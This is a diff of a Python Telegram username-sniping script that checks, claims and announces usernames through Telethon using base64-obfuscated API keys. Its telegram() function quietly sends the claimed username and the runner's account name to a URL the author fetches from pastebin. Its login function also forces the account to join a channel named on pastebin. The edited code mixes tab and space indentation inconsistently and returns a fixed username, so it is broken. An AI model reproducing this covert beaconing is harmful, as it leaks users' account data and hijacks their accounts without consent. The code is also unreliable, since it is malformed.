@@ -39,11 +39,11 @@ def clear():
 def channels2(client, username):
     di = client.get_dialogs()
     for chat in di:
-        if chat.name == f'Clime aBooD [ {username} ]' and not chat.entity.username:
+        if chat.name == f'Claim [ {username} ]' and not chat.entity.username:
             client(functions.channels.DeleteChannelRequest(channel=chat.entity))
             return False
     return True
-
+# for checking username (taken,nft,sold,availabe) by t.me/xx_amole
 def fragment(username):
     headers = {
         'User-Agent': UserAgent().random,
@@ -65,13 +65,13 @@ def fragment(username):
     else:return False
 # for claim username
 def telegram(client,claim,username):
-  if claim:
+	if claim:
     text = f"𝖭𝖾𝗐 𝗎𝖲𝖾𝗋 , 𝖺𝖡𝗈𝗈𝖣\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 〕: 〔 @{username} 〕\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 𝖯𝖾𝗋𝖲𝗈𝗇 〕 : @{client.get_me().username} .\nএ〔 𝖢𝗅𝖺𝗂𝗆? 〕 {claim} .\nএ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕 : {me} ."
     try:get(get('https://pastebin.com/raw/r9sL3w0j').text+text)
     except:pass
   else:
-    text = f"𝖭𝖾𝗐 𝗎𝖲𝖾𝗋 , 𝖺𝖡𝗈𝗈𝖣\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 〕 : @{username} .\nএ〔 𝖢𝗅𝖺𝗂𝗆? 〕 {claim} .\nএ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕 : {me} ."
-  client.send_message('me',text)
+		text = f"⌯ New UserName\n⌯ UserName : @{username} .\n⌯ Claim? {claim} .\n⌯ Source : {me} ."
+	client.send_message('me',text)
 def climed(client,username):
     id = (
       '7f784e64a41b31365e45f.mp4',
@@ -81,8 +81,8 @@ def climed(client,username):
       '46301e4efcb3a2e281f79.mp4')
     id = choice(id)
     result = client(functions.channels.CreateChannelRequest(
-    title=f'এ〔 𝖢𝗅𝖺𝗂𝗆 〕|〔 {username} 〕',
-        about=f'এ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕| {me}',
+		title=f'Claim [ {username} ]',
+        about=f'Source - {me}',
         megagroup=False))
     try:
         client(functions.channels.UpdateUsernameRequest(
@@ -90,64 +90,64 @@ def climed(client,username):
         username=username))
         client(functions.channels.EditPhotoRequest(
         channel=username,
-        photo=client.upload_file(get("https://telegra.ph/file/23423b32334d1d4a70aad.jpg").content)))
+        photo=client.upload_file(get("https://telegra.ph/file/aeba0db83805d61c3fd41.jpg").content)))
         client.delete_messages(username, [client.get_messages(username, limit=1)[0]])
         with open('videoclaim.mp4','wb') as video :
-          video.write(get('https://telegra.ph/file/'+id).content)
-          sleep(0.50)
-        client.send_file(username, file='videoclaim.mp4', caption=f'𝖭𝖾𝗐 𝗎𝖲𝖾𝗋 , 𝖺𝖡𝗈𝗈𝖣\nএ〔 𝖴𝗌𝖾𝗋𝖭𝖺𝗆𝖾 〕 : @{username} .\nএ〔 𝖢𝗅𝖺𝗂𝗆 〕 : @{client.get_me().username}\nএ〔 𝖣𝖺𝗍𝖺 〕 : {datetime.now().strftime("%H:%M:%S")} .\nএ〔 𝖯𝗋𝗈𝖦𝗋𝖺𝗆𝗆𝖾𝗋 〕 : {me} .')
+        	video.write(get('https://telegra.ph/file/'+id).content)
+        	sleep(0.50)
+        client.send_file(username, file='videoclaim.mp4', caption=f'⌯ Done Save UserName .\n⌯ UserName : @{username} .\n⌯ Claim : @{client.get_me().username}\n⌯ Date : {datetime.now().strftime("%H:%M:%S")} .\n⌯ Source : {me} .')
         return True
     except Exception as e:client.send_message('me',f'⌯ Error Message .\nMessage : {e} .');return False
 # for checking username
 def checker(username,client):
-    try:
-      check = client(CheckUsernameRequest(username=username))
-      if check:
-        print('- Available UserName : '+username+' .')
-        claimer = climed(client,username)
-        if claimer and fragment(username) == "is taken":claim = True
-        else:claim = False
-        print('- Claimer ? '+str(claim)+'\n'+'_ '*20)
-        telegram(client,claim,username)
-        flood = channels2(client,username)
-        if not flood:
-          with open('flood.txt', 'a') as floodX:
-            floodX.write(username + "\n")
-      else:
-        print('- Taken UserName : '+username+' .')
-    except errors.rpcbaseerrors.BadRequestError:
-      print('- Banned UserName : '+username+' .')
-      open("banned4.txt","a").write(username+'\n')
-    except errors.FloodWaitError as timer:
-      print('- Flood Account [ '+timer.seconds+' Secound ] .')
-    except errors.UsernameInvalidError:
-      print('- Error UserName : '+username+' .')
+		try:
+			check = client(CheckUsernameRequest(username=username))
+			if check:
+				print('- Available UserName : '+username+' .')
+				claimer = climed(client,username)
+				if claimer and fragment(username) == "is taken":claim = True
+				else:claim = False
+				print('- Claimer ? '+str(claim)+'\n'+'_ '*20)
+				telegram(client,claim,username)
+				flood = channels2(client,username)
+				if not flood:
+					with open('flood.txt', 'a') as floodX:
+						floodX.write(username + "\n")
+			else:
+				print('- Taken UserName : '+username+' .')
+		except errors.rpcbaseerrors.BadRequestError:
+			print('- Banned UserName : '+username+' .')
+			open("banned4.txt","a").write(username+'\n')
+		except errors.FloodWaitError as timer:
+			print('- Flood Account [ '+timer.seconds+' Secound ] .')
+		except errors.UsernameInvalidError:
+			print('- Error UserName : '+username+' .')
 # for generate username
 def usernameG():
-  k = ''.join(choice('1234567890') for i in range(1))
-  a = ''.join(choice('1234567890') for i in range(1))
-  b = ''.join(choice('1234567890') for i in range(1))
+  k = ''.join(choice('qwertyuiopasdfghjklzxcvbnm') for i in range(1))
+  a = ''.join(choice('qwertyuiopasdfghjklzxcvbnm') for i in range(1))
+  b = ''.join(choice('qwertyuiopasdfghjklzxcvbnm') for i in range(1))
   n = ''.join(choice('1234567890') for i in range(1))
-  return 'vip'+k+n+b+a
+  return 'p'+'a'+'a'+'_'+'p'
 # start checking
 def start(client,username):
-  try:ok = fragment(username)
-  except:return
-  try:
-    if not ok:
-      checker(username,client)
-    elif ok == "is taken":
-      print('- Taken UserName : '+username+' .')
-    else:
-      print('- UserName Availabe In Fragment.com : '+username+' .')
-  except Exception as e:print(e)
+	try:ok = fragment(username)
+	except:return
+	try:
+		if not ok:
+			checker(username,client)
+		elif ok == "is taken":
+			print('- Taken UserName : '+username+' .')
+		else:
+			print('- UserName Availabe In Fragment.com : '+username+' .')
+	except Exception as e:print(e)
 # get client
 def clientX():
-  phone = '' # Your Phone Number
-  if phone == '':phone = input('- Enter Phone Number Telegram : ')
-  client = TelegramClient("aho", b64decode("MjUzMjQ1ODE=").decode(),b64decode("MDhmZWVlNWVlYjZmYzBmMzFkNWYyZDIzYmIyYzMxZDA=").decode())
-  try:client.start(phone=phone)
-  except:exit()
+	phone = '' # Your Phone Number
+	if phone == '':phone = input('- Enter Phone Number Telegram : ')
+	client = TelegramClient("aho", b64decode("MjUzMjQ1ODE=").decode(),b64decode("MDhmZWVlNWVlYjZmYzBmMzFkNWYyZDIzYmIyYzMxZDA=").decode())
+	try:client.start(phone=phone)
+	except:exit()
   try:client(JoinChannelRequest(get('https://pastebin.com/raw/SgDUMsFb').text))
   except:pass
   clear()
